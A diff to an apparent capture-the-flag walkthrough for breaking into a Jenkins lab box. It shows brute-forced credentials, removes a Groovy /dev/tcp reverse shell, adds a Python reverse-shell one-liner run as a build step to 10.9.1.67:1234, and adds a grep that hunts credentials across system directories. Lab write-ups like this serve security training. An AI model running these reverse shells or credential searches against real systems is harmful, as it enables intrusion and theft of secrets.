@@ -643,8 +643,22 @@ Brute-force Jenkins login form:
 	...
  	[8080][http-post-form] host: 172.17.0.2   login: admin   password: spongebob
 	...
- In Jenkis, using the script console we can get a reverse shell using Groovy script: https://gist.github.com/rootsecdev/273f22a747753e2b17a2fd19c248c4b7
+ In Jenkis create a test build project, then in configure, add a build action -> execute shell command:
 
- 	r = Runtime.getRuntime() p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.9.1.67/1234;cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]) p.waitFor()
+  	#!/bin/bash
+	python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.1.67",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'
+
+Since python 2.7 is enabled we use it to get a reverse shell, just build the project.
+
+### Get root
+Again we search for juicy information:
+
+	 grep -Ril "password\|CredentiaL" /home /etc /opt /var/www 2>/dev/null
+	...
+	/etc/services
+	/opt/note.txt
+
+See note
+ 	
 
  	
